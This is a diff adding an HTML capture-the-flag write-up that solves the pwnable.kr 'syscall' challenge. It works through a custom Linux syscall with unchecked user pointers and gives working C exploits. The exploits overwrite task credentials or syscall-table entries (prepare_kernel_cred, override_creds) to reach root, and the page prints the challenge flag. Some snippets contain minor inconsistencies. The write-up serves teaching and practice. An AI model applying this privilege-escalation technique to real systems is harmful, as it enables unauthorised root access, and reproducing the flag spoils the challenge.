@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="description" content="Detailed pwnable.kr syscall challenge writeup, covering kernel exploitation, arbitrary write primitives, credential structure manipulation, and privilege escalation techniques.">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pwnable.kr: syscall Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="canonical" href="https://yaelshechter.com/pwnable-syscall.html" />
+
+    <script type="application/ld+json">
+        {
+            "@context": "https://schema.org",
+            "@type": "TechArticle",
+            "headline": "pwnable.kr syscall Writeup - Kernel Exploitation and Privilege Escalation",
+            "author": {
+                "@type": "Person",
+                "name": "Yael Shechter",
+                "url": "https://yaelshechter.github.io/"
+            },
+            "datePublished": "2026-02-01",
+            "dateModified": "2026-02-01",
+            "keywords": ["pwnable.kr", "kernel exploitation", "privilege escalation", "syscall", "credentials"],
+            "url": "https://yaelshechter.github.com/pwnable-syscall.html"
+        }
+    </script>
+
+    <!-- Syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: #fafafa;
+            color: #2d3748;
+            line-height: 1.7;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 60px 24px;
+        }
+
+        header {
+            margin-bottom: 64px;
+            padding-bottom: 32px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .back-link {
+            color: #4299e1;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: color 0.2s;
+            display: inline-block;
+            margin-bottom: 24px;
+        }
+
+        .back-link::before {
+            content: '← ';
+        }
+
+        .back-link:hover {
+            color: #2b6cb0;
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1a202c;
+            letter-spacing: -0.02em;
+        }
+
+        .meta {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            font-size: 14px;
+            color: #718096;
+            margin-bottom: 8px;
+        }
+
+        .meta span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .tags {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 16px;
+        }
+
+        .tag {
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 4px;
+            background: #edf2f7;
+            color: #4a5568;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .banner{
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 16px;
+            margin: 16px 0 24px;
+        }
+
+        article {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+        }
+
+        article h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a202c;
+            margin-top: 40px;
+            margin-bottom: 16px;
+        }
+
+        article h2:first-child {
+            margin-top: 0;
+        }
+
+        article h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 32px;
+            margin-bottom: 12px;
+        }
+
+        article p {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+            color: #2d3748;
+        }
+
+        article ul, article ol {
+            margin-left: 24px;
+            margin-bottom: 16px;
+        }
+
+        article li {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 8px;
+        }
+
+        article a {
+            color: #4299e1;
+            text-decoration: none;
+        }
+
+        article a:hover {
+            text-decoration: underline;
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            background: #f7fafc;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #2d3748;
+        }
+
+        pre {
+            background: #1a202c;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+            border: 1px solid #2d3748;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: #e2e8f0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .hljs {
+            background: transparent;
+            color: #e2e8f0;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid #e2e8f0;
+            margin: 32px 0;
+        }
+
+        .figure-image {
+            width: 100%;
+            max-width: 600px;
+            display: block;
+            margin: 24px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .cat-button {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: white;
+            border: 2px solid #2d3748;
+            cursor: pointer;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            z-index: 1000;
+        }
+
+        .cat-button:hover {
+            transform: scale(1.1);
+            box-shadow: 4px 4px 0 #2d3748;
+        }
+
+        .cat-button:active {
+            transform: scale(0.95);
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            article {
+                padding: 24px;
+            }
+
+            pre {
+                padding: 16px;
+            }
+        }
+    </style>
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-88239B8JH3"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-88239B8JH3');
+    </script>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <a href="index.html" class="back-link">Back to writeups</a>
+        <h1>pwnable.kr: syscall writeup</h1>
+        <div class="meta">
+            <span>📅 Jan 2026</span>
+            <span>🏆 200 points</span>
+            <span>📂 Rookiss</span>
+        </div>
+        <div class="tags">
+            <span class="tag">kernel exploitation</span>
+            <span class="tag">privilege escalation</span>
+            <span class="tag">arbitrary write</span>
+            <span class="tag">credentials</span>
+            <span class="tag">ARM</span>
+        </div>
+    </header>
+
+    <article>
+        <img src="images/pwnable-banner.png" alt="banner" class="banner" />
+
+        <h2>Challenge Description</h2>
+        <p>We get the following hint:</p>
+
+        <pre><code>I made a new system call for Linux kernel.
+It converts lowercase letters to upper case letters.
+would you like to see the implementation?
+
+FYI: http://pwnable.kr/bin/syscall.c
+
+ssh syscall@pwnable.kr -p2222 (pw:guest)</code></pre>
+
+        <p>Let's connect:</p>
+        <pre><code>ssh syscall@pwnable.kr -p2222</code></pre>
+
+        <p>When connecting, the terminal floods with kernel boot messages. I wait for it to finish and eventually get dropped into a shell. At the end of the log I see this print:</p>
+
+        <pre><code>...
+sys_upper(number : 223) is added
+cttyhack: can't open '/dev/ttyS0': No such file or directory
+sh: can't access tty; job control turned off
+/ $</code></pre>
+
+        <h2>Source Code Analysis</h2>
+        <p>The challenge provides source code for a custom kernel module that adds a new system call:</p>
+
+        <pre><code class="language-c">// adding a new system call : sys_upper
+
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/slab.h&gt;
+#include &lt;linux/vmalloc.h&gt;
+#include &lt;linux/mm.h&gt;
+#include &lt;asm/unistd.h&gt;
+#include &lt;asm/page.h&gt;
+#include &lt;linux/syscalls.h&gt;
+
+#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
+#define NR_SYS_UNUSED		223
+
+//Pointers to re-mapped writable pages
+unsigned int** sct;
+
+asmlinkage long sys_upper(char *in, char* out){
+	int len = strlen(in);
+	int i;
+	for(i=0; i&lt;len; i++){
+		if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){
+			out[i] = in[i] - 0x20;
+		}
+		else{
+			out[i] = in[i];
+		}
+	}
+	return 0;
+}
+
+static int __init initmodule(void ){
+	sct = (unsigned int**)SYS_CALL_TABLE;
+	sct[NR_SYS_UNUSED] = sys_upper;
+	printk("sys_upper(number : 223) is added\n");
+	return 0;
+}
+
+static void __exit exitmodule(void ){
+	return;
+}
+
+module_init( initmodule );
+module_exit( exitmodule );</code></pre>
+
+        <p>Observations:</p>
+        <ol>
+            <li>System call number 223 is registered with a custom <code>sys_upper</code> function</li>
+            <li>The syscall table is at a hardcoded address: <code>0x8000e348</code></li>
+            <li>The <code>sys_upper</code> function converts lowercase ascii characters to uppercase</li>
+            <li>It takes two parameters: <code>in</code> (input buffer) and <code>out</code> (output buffer)</li>
+            <li>There is no bounds checking on the buffers</li>
+            <li>The syscall table (<code>sct</code>) is writable from kernel space</li>
+        </ol>
+
+        <h2>First Attempt: Buffer Overflow</h2>
+        <p>Looking at the code, my first thought was buffer overflow. The syscall uses <code>strlen()</code> and has no bounds checking:</p>
+
+        <pre><code class="language-c">int len = strlen(in);
+int i;
+for(i=0; i&lt;len; i++){
+	if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){
+		out[i] = in[i] - 0x20;
+	}
+	else{
+		out[i] = in[i];
+	}
+}</code></pre>
+
+        <p>I tested this with a small output buffer to trigger an overflow:</p>
+
+        <pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#define __NR_sys_upper 223
+
+int main(void) {
+    char in[] = "Hello kernel syscall!";
+    char out[5]; // buffer overflow, getting stack smashing detected
+    memset(out, 0, sizeof(out));
+
+    long upper_ret = syscall(__NR_sys_upper, in, out);
+    printf("upper_ret : %d\n", upper_ret);
+
+    printf("in : %s\n", in);
+    printf("out: %s\n", out);
+    return 0;
+}</code></pre>
+
+        <p>This triggered a stack canary protection message, which means I could overflow the stack. However, the challenge environment had no gdb or debugging tools, making exploitation difficult.</p>
+
+        <p>But I learned two important things:</p>
+        <ol>
+            <li>I can call the syscall successfully</li>
+            <li>I have complete control over the arguments</li>
+        </ol>
+
+        <h2>Setting Up a Local Environment</h2>
+        <p>To understand the vulnerability better, I needed a local debugging setup. The challenge runs an old kernel:</p>
+
+        <pre><code>/ $ uname -a
+Linux (none) 3.11.4 #13 SMP Fri Jul 11 00:48:31 PDT 2014 armv7l GNU/Linux</code></pre>
+
+        <p>I tried setting up kernel 3.11.4 locally, but it was really hard and I had tons of compilation errors. Each run took forever before it crashed, so it was very time consuming.</p>
+
+        <p>Instead, I used a modern kernel (5.4) from <a href="https://github.com/pwncollege/pwnkernel" target="_blank" rel="noreferrer">pwn.college's kernel setup</a>. The version was different from the challenge environment, but I assumed that the primitive would be the same, and I could also learn more about the kernel internals.</p>
+
+        <h3>Writing the Syscall in Modern Kernel</h3>
+        <p>I first tried to create the syscall as a loadable kernel module using <code>insmod</code>, but this didn't work in modern kernels because <strong>the syscall table is read-only</strong> - you can't modify it at runtime like the challenge's old kernel allows.</p>
+
+        <p>Instead, I followed the <a href="https://www.kernel.org/doc/html/v5.5/process/adding-syscalls.html" target="_blank" rel="noreferrer">kernel documentation on adding syscalls</a> to add the syscall to the kernel source code directly.</p>
+
+        <p>In <code>linux-5.4/kernel/fork.c</code> I added the syscall implementation:</p>
+
+        <pre><code class="language-c">SYSCALL_DEFINE2(upper, const char __user *, in, char __user *, out)
+{
+	pr_info("Hello from Yael's syscall");
+	int len = strlen(in);
+	int i;
+	for(i=0; i&lt;len; i++){
+			if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a){
+					out[i] = in[i] - 0x20;
+			}
+			else{
+					out[i] = in[i];
+			}
+	}
+	return 0;
+}</code></pre>
+
+        <p>In <code>linux-5.4/include/linux/syscalls.h</code> I declared the syscall:</p>
+
+        <pre><code class="language-c">asmlinkage long sys_upper(const char __user *in, char __user *out);</code></pre>
+
+        <p>In <code>linux-5.4/arch/x86/entry/syscalls/syscall_64.tbl</code> I added the syscall number to the syscall table with number 436:</p>
+
+        <pre><code>436     common  upper                   __x64_sys_upper</code></pre>
+
+        <p>Then I compiled the kernel successfully and launched it in QEMU.</p>
+
+        <h3>Debugging and Finding the Primitive</h3>
+        <p>To debug, I ran the kernel in one terminal:</p>
+
+        <pre><code class="language-bash">./launch.sh  # includes -s flag for qemu to enable gdb attachment</code></pre>
+
+        <p>In another terminal, I attached gdb:</p>
+
+        <pre><code class="language-bash">pwndbg ./linux-5.4/vmlinux
+# inside gdb
+target remote :1234
+break __do_sys_upper
+continue</code></pre>
+
+        <p>With gdb running, I started testing the syscall. I passed it various inputs and noticed something interesting: I control both the <code>in</code> and <code>out</code> pointers completely.</p>
+
+        <p>This means:</p>
+        <ul>
+            <li>I can read from any address (<code>in</code>)</li>
+            <li>I can write to any address (<code>out</code>)</li>
+        </ul>
+        <p>This is an arbitrary write primitive!</p>
+
+        <p>The syscall reads bytes from <code>in</code>, potentially modifies them if they are in the lowercase range (uppercase conversion), and writes them to <code>out</code>. Since both pointers come from the user, I can point them anywhere in kernel memory.</p>
+
+        <h3>Exploitation Strategy</h3>
+        <p>Having an arbitrary write primitive is great, but the question is: what to write and where? The goal is privilege escalation to root.</p>
+
+        <h2>Understanding Linux Credentials</h2>
+        <p>In the Linux kernel, every process is represented by a <code>task_struct</code>. Each task has an associated <code>cred</code> (credentials) structure containing:</p>
+
+        <ul>
+            <li>User ID (UID)</li>
+            <li>Group ID (GID)</li>
+            <li>Various capability flags</li>
+        </ul>
+
+        <p>When you run a program as a regular user, your task's <code>cred</code> has your UID (e.g., 1000). Root processes have UID 0. The kernel checks these credentials for all privileged operations.</p>
+
+        <p>The <code>task_struct</code> is defined in the <code>include/linux/sched.h</code> <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027" target="_blank" rel="noreferrer">file</a> and contains the cred pointers:</p>
+
+        <pre><code class="language-c">struct task_struct {
+  ...
+  /* process credentials */
+  const struct cred __rcu *real_cred; /* objective and real subjective task * credentials (COW) */
+  const struct cred __rcu *cred;	  /* effective (overridable) subjective task * credentials (COW) */
+  ...
+}</code></pre>
+
+        <p>The <code>cred</code> structure is defined in <code>include/linux/cred.h</code> <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102" target="_blank" rel="noreferrer">file</a>:</p>
+
+        <pre><code class="language-c">struct cred {
+  ...
+  kuid_t		uid;		/* real UID of the task */
+  kgid_t		gid;		/* real GID of the task */
+  kuid_t		suid;		/* saved UID of the task */
+  kgid_t		sgid;		/* saved GID of the task */
+  kuid_t		euid;		/* effective UID of the task */
+  kgid_t		egid;		/* effective GID of the task */
+  ...
+}</code></pre>
+
+        <p>The kernel provides helper functions for credential management:</p>
+
+        <pre><code class="language-c">struct cred *prepare_kernel_cred(struct task_struct *)   // Prepare a set of credentials for a kernel service;
+int commit_creds(struct cred *);                         // Permanently replaces the current task's credentials
+const struct cred *override_creds(const struct cred *);  // Temporarily overrides credentials (must be reverted with `revert_creds`)</code></pre>
+
+        <p>When calling <code>prepare_kernel_cred(NULL)</code>, it creates a new credential structure with all IDs set to 0 (root). Then, calling <code>commit_creds(cred)</code> sets the current task's credentials to this new structure, effectively making the process root.</p>
+
+        <p>So, the standard kernel privilege escalation pattern is:</p>
+
+        <pre><code class="language-c">struct cred *cred = prepare_kernel_cred(NULL);
+commit_creds(cred); // or override_creds(cred);</code></pre>
+
+        <p>I wasn't sure how I could call these functions for privilege escalation, since the syscall table was not writable. Instead, I thought about directly overriding the <code>task-&gt;cred-&gt;uid</code> and <code>task-&gt;cred-&gt;euid</code> to 0 and become root.</p>
+
+        <h3>Finding Credential Addresses</h3>
+        <p>For this direct override, I need to find the address of the <code>task-&gt;cred-&gt;uid</code> and <code>task-&gt;cred-&gt;euid</code>.</p>
+
+        <p>I used this <code>.gdbinit</code> script to print the address that points to the creds.</p>
+
+        <pre><code class="language-bash">define showcred
+  set $cpu = 0
+  set $off = __per_cpu_offset[$cpu]
+  set $task = *(struct task_struct **)((char *)&amp;current_task + $off)
+
+  printf "cpu=%d  task=%p  pid=%d comm=%s\n", $cpu, $task, $task-&gt;pid, $task-&gt;comm
+  printf "&amp;task-&gt;cred = %p\n", &amp;($task-&gt;cred)
+  printf "&amp;task-&gt;real_cred = %p\n", &amp;($task-&gt;real_cred)
+  printf "task-&gt;cred  = %p\n", $task-&gt;cred
+  if $argc &gt; 0
+    p *(struct cred *)$task-&gt;cred
+  end
+end
+end
+
+document showcred
+  showcred        → prints task + cred + real_cred pointer only
+  showcred full   → also prints struct cred
+end</code></pre>
+
+        <p>Running this multiple times, I noticed something very useful: <strong>without KASLR, the credentials structure address was always the same!</strong></p>
+
+        <pre><code>cpu=0  task=0xffff888006bb0c40  pid=99 comm=euid
+&amp;task-&gt;cred = 0xffff888006bb1278
+&amp;task-&gt;real_cred = 0xffff888006bb1270</code></pre>
+
+        <p>These addresses (<code>0xffff888006bb1278</code> and <code>0xffff888006bb1270</code>) were the same across runs, making them predictable targets for my arbitrary write.</p>
+
+        <h3>The Null Byte Problem</h3>
+        <p>My idea was to overwrite <code>task-&gt;cred-&gt;uid</code> and <code>task-&gt;cred-&gt;euid</code> with 0. However, there's a problem: the integer 0 is a null byte (<code>\x00</code>), and <code>strlen()</code> in the syscall stops at null bytes. The syscall would see length 0 and exit without writing anything.</p>
+
+        <h3>The Solution: init_cred</h3>
+        <p>Instead of trying to write zeros, I found special credential struct called <code>init_cred</code> - this is the kernel's initial credential structure, and it has all the IDs already set to 0. If I can make the task's credential pointers point to <code>init_cred</code>, we instantly become root.</p>
+
+        <p>I found <code>init_cred</code>'s address in <code>/proc/kallsyms</code>.</p>
+
+        <p><strong>Exploit plan:</strong></p>
+        <ol>
+            <li>Locate <code>init_cred</code> in kallsyms (consistent address without KASLR)</li>
+            <li>Use arbitrary write to overwrite <code>&amp;(task-&gt;cred)</code> with the address of <code>init_cred</code></li>
+            <li>Overwrite <code>&amp;(task-&gt;real_cred)</code> with <code>init_cred</code> as well (both pointers must match to avoid kernel panic: <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/cred.c#L139" target="_blank" rel="noreferrer">kernel source</a>)</li>
+        </ol>
+
+        <h3>Local Exploit</h3>
+
+        <pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;errno.h&gt;
+
+#define __NR_sys_upper 436
+
+int main(void) {
+    uint64_t init_cred = 0xffffffff82443f40ULL;
+    unsigned char buf[8];
+    memcpy(buf, &amp;init_cred, 8);
+
+	// from gdb: &amp;task-&gt;cred = 0xffff888006bb1278 (consistent across runs due to no KASLR)
+    uint64_t current_cred_ptr = 0xffff888006bb1278ULL;
+    uint64_t real_cred_ptr = 0xffff888006bb1270ULL;
+
+    printf("[*] Before: UID=%d, EUID=%d\n", getuid(), geteuid());
+
+    long ret = syscall(__NR_sys_upper, buf, current_cred_ptr);
+    long ret2 = syscall(__NR_sys_upper, buf, real_cred_ptr);
+
+    printf("syscall overriding cred ptr returned: %ld\n", ret);
+    printf("syscall overriding real cred ptr returned: %ld\n", ret2);
+
+    printf("[*] After: UID=%d, EUID=%d\n", getuid(), geteuid());
+    system("/bin/sh");
+
+    return 0;
+}</code></pre>
+
+        <p>compile it with</p>
+        <pre><code class="language-bash">gcc -static -o exploit exploit.c</code></pre>
+
+        <p>and running it:</p>
+        <pre><code>/ $ id -u
+1000
+/ $ ./exploit
+[*] Before: UID=1000, EUID=1000
+syscall overriding cred ptr returned: 0
+syscall overriding real cred ptr returned: 0
+[*] After: UID=0, EUID=0
+
+/ $ id -u
+0</code></pre>
+
+        <p>It worked! we are root in the local environment.</p>
+
+        <hr />
+
+        <h2>Back to pwnable.kr</h2>
+        <p>It was great having the debugging environment and being able to peek into all the kernel addresses. In the pwnable.kr environment, things are a bit different and I have much less observability, but on the other hand, the kernel version is much older and lacks many of the constraints that the modern kernel version I used had.</p>
+
+        <p>However, the primitive is the same in both cases: I can write whatever I want to wherever I want.</p>
+
+        <p>The pwnable.kr environment differs:</p>
+        <ul>
+            <li>Much older kernel (3.11.4 vs 5.4)</li>
+            <li>ARM architecture (armv7l)</li>
+            <li><strong>Writable syscall table</strong></li>
+        </ul>
+
+        <h3>Overriding the syscall table</h3>
+        <p>As observed from the syscall source code above, the syscall table is writable from the kernel. This means that, using the write primitive, I can override entries in the syscall table.</p>
+
+        <p>The syscall table contains the address of each syscall function, and each entry resides at the offset corresponding to the syscall number (for example, the write syscall is 0 so it's the first entry, execve is 11 so it's at offset 11, etc.).</p>
+
+        <p>I decided that a good approach would be to overwrite some entries to point to the kernel APIs we discussed earlier: <code>prepare_kernel_creds</code> and <code>commit_creds</code>, which would allow me to become root.</p>
+
+        <p>I first tried a POC where I wrote the <code>time</code> syscall into the <code>exit</code> entry, since it's easy to verify whether <code>time</code> was called (the return value is the current time).</p>
+
+        <p>This is the calculation of the address to override in the syscall table:</p>
+        <ul>
+            <li>We start with the syscall table address: <code>0x8000e348</code></li>
+            <li>Each entry is 4 bytes (32 bits) long for 32-bit architecture</li>
+            <li>We need the 6th entry for <code>exit</code> (syscall number 6)</li>
+        </ul>
+
+        <pre><code>__NR_exit = 6                            # 6 is the syscall number for exit
+sys_call_table[6]
+= *(unsigned int *)(0x8000e348 + 6 * 4)  # 0x8000e348 is the address of the syscall table, 4 bytes per entry
+= *(unsigned int *)(0x8000e360)</code></pre>
+
+        <p>This is the code that overrides <code>exit</code> with <code>time</code> and calls it:</p>
+
+        <pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+
+#define __NR_sys_upper 223
+#define __NR_exit 6
+
+
+int main(void) {
+	uint32_t sys_time = 0x80023530; // the address of sys_time from kallsyms
+
+    long ret = syscall(__NR_sys_upper, &amp;sys_time, 0x8000e360); // 0x8000e360 is the address in syscall table of exit
+    printf("syscall returned: %ld\n", ret);
+
+    long ret2 = syscall(__NR_prepare, NULL); // calling exit with actually time
+
+    printf("syscall exit/time returned: %ld\n", ret2);
+    return 0;
+}</code></pre>
+
+        <p>got</p>
+        <pre><code>/tmp/yael $ ./a.out
+syscall returned: 0
+syscall exit/time returned: 1768243724</code></pre>
+
+        <p>Using the epoch conversion tool:<br />
+            1768243724 =&gt;<br />
+            <strong>GMT</strong>: Monday, January 12, 2026 6:48:44 PM</p>
+
+        <p>Yess!!</p>
+
+        <h3>Writing kernel API to the syscall table</h3>
+        <p>Now I want to write the actual kernel API to the syscall table. I first tried writing <code>prepare_kernel_cred</code> and <code>commit_creds</code>:</p>
+
+        <pre><code class="language-c">int main(void) {
+    uint32_t prepare = 0x8003f924; // the address of prepare_kernel_cred()
+    long ret = syscall(__NR_sys_upper, &amp;prepare, 0x8000e7f8);
+	printf("syscall changing to prepare returned: %ld\n", ret);
+
+    uint32_t commit = 0x8003f56c; // the address of commit_creds(struct...)
+    long ret2 = syscall(__NR_sys_upper, &amp;commit, 0x8000e7fc);
+    printf("syscall changing to commit returned: %ld\n", ret2);
+
+    long creds = syscall(__NR_prepare, NULL); // calling prepare with null
+    printf("Creds: 0x%lx\n", (unsigned long)creds);
+
+    long commit_ret = syscall(__NR_commit, (void *)creds); // commit creds
+	printf("syscall commit creds returned: %ld\n", commit_ret);
+
+    printf("UID: %d\n", getuid());
+    printf("EUID: %d\n", geteuid());
+
+    system("/bin/sh");
+    return 0;
+}</code></pre>
+
+        <p>But this didn't work.</p>
+
+        <p>I then realized that the address of <code>commit_creds</code> contains the byte <code>0x6c</code>, which is the lowercase ASCII character <code>l</code>. This means that when passing the <code>commit_creds</code> pointer to <code>upper()</code>, the address is modified, resulting in a different address and making it impossible to call <code>commit_creds</code> this way:</p>
+
+        <pre><code>Original commit_creds:      0x8003f56c
+							        ^^-- 0x6c = 'l' (ASCII 108)
+After sys_upper:            0x8003f54c
+							        ^^-- 0x4c = 'L' (ASCII 76)</code></pre>
+
+        <p>I tried replacing it with the byte <code>0x60</code>, which is outside the lowercase ASCII range. Since it is the least significant byte, I hoped it would land on some NOP padding and eventually reach the <code>commit_creds</code> function. That didn't work either.</p>
+
+        <p>Looking for other alternatives:</p>
+
+        <pre><code>/ $ cat /proc/kallsyms | grep cred | grep " T "
+8002c19c T kill_pid_info_as_cred
+8003f3d8 T override_creds
+8003f44c T prepare_creds
+8003f4c8 T __put_cred
+8003f51c T revert_creds
+8003f56c T commit_creds
+8003f800 T abort_creds
+8003f83c T exit_creds
+8003f8bc T get_task_cred
+8003f924 T prepare_kernel_cred
+...</code></pre>
+
+        <p><code>override_creds</code> looks interesting.</p>
+
+        <p>Looking at the documentation:</p>
+
+        <p><em><code>override_creds</code> - Override the current process's subjective credentials.</em></p>
+
+        <p>This means it could serve as a good replacement for <code>commit_creds</code>, without the ascii complication.</p>
+
+        <p>Trying it:</p>
+
+        <pre><code class="language-c">#include &lt;unistd.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+
+#define __NR_sys_upper 223
+#define __NR_prepare 224
+#define __NR_override 225
+
+typedef struct context_arm {
+    uint32_t prepare_kernel_cred_addr;
+    uint32_t override_creds_addr;
+    uint32_t syscall_table_prepare_entry;
+    uint32_t syscall_table_override_entry;
+} context_arm;
+
+int main(void) {
+    context_arm ctx = {
+        .prepare_kernel_cred_addr = 0x8003f924,
+        .override_creds_addr = 0x8003f3d8,
+        .syscall_table_prepare_entry = 0x8000e6c8,  // 224th syscall
+        .syscall_table_override_entry = 0x8000e6cc   // 225th syscall
+    };
+
+    long upper_prepare_ret = syscall(__NR_sys_upper, &amp;ctx.prepare_kernel_cred_addr, ctx.syscall_table_prepare_entry);
+    printf("syscall changing to prepare returned: %ld\n", upper_prepare_ret);
+
+    long upper_override_ret = syscall(__NR_sys_upper, &amp;ctx.override_creds_addr, ctx.syscall_table_override_entry);
+    printf("syscall changing to override returned: %ld\n", upper_override_ret);
+
+    long creds = syscall(__NR_prepare, NULL);
+    printf("Creds: 0x%lx\n", (unsigned long)creds);
+
+    long override_ret = syscall(__NR_override, (void *)creds);
+    printf("syscall override creds returned: %ld (0x%lx)\n",
+       override_ret, (unsigned long)override_ret);
+
+    printf("UID: %d\n", getuid());
+    printf("EUID: %d\n", geteuid());
+
+    system("/bin/sh");
+    return 0;
+}</code></pre>
+
+        <pre><code class="language-bash">gcc exploit.c -o exploit</code></pre>
+
+        <p>running it:</p>
+
+        <pre><code>/ $ /tmp/exploit
+syscall changing to prepare returned: 0
+syscall changing to override returned: 0
+Creds: 0x8372d280
+syscall override creds returned: -2057227904 (0x85613180) # override should return creds pointer
+UID: 0
+EUID: 0
+/ $ id -u  # just to make sure :D
+0
+/ $ find / -type f -name "flag*" 2&gt;/dev/null
+/root/flag
+/ $ cat /root/flag
+Must_san1tize_Us3r_p0int3r</code></pre>
+
+        <p>Finally :)</p>
+
+        <h2>References</h2>
+        <ul>
+            <li>Highly recommended pwn college kernel for debugging: <a href="https://github.com/pwncollege/pwnkernel" target="_blank" rel="noreferrer">https://github.com/pwncollege/pwnkernel</a></li>
+            <li>pwn college kernel security and exploitation lectures: <a href="https://www.youtube.com/playlist?list=PL-ymxv0nOtqowTpJEW4XTiGQYx6iwa6og" target="_blank" rel="noreferrer">https://www.youtube.com/playlist?list=PL-ymxv0nOtqowTpJEW4XTiGQYx6iwa6og</a></li>
+            <li>Great video of adding syscall to Linux kernel: <a href="https://www.youtube.com/watch?v=Kn6D7sH7Fts" target="_blank" rel="noreferrer">https://www.youtube.com/watch?v=Kn6D7sH7Fts</a></li>
+            <li>Linux kernel credentials documentation: <a href="https://www.kernel.org/doc/Documentation/security/credentials.txt" target="_blank" rel="noreferrer">https://www.kernel.org/doc/Documentation/security/credentials.txt</a></li>
+            <li>Linux kernel 3.11.4 source (cred.c): <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/cred.c" target="_blank" rel="noreferrer">https://elixir.bootlin.com/linux/v3.11.4/source/kernel/cred.c</a></li>
+        </ul>
+    </article>
+</div>
+</body>
+</html>
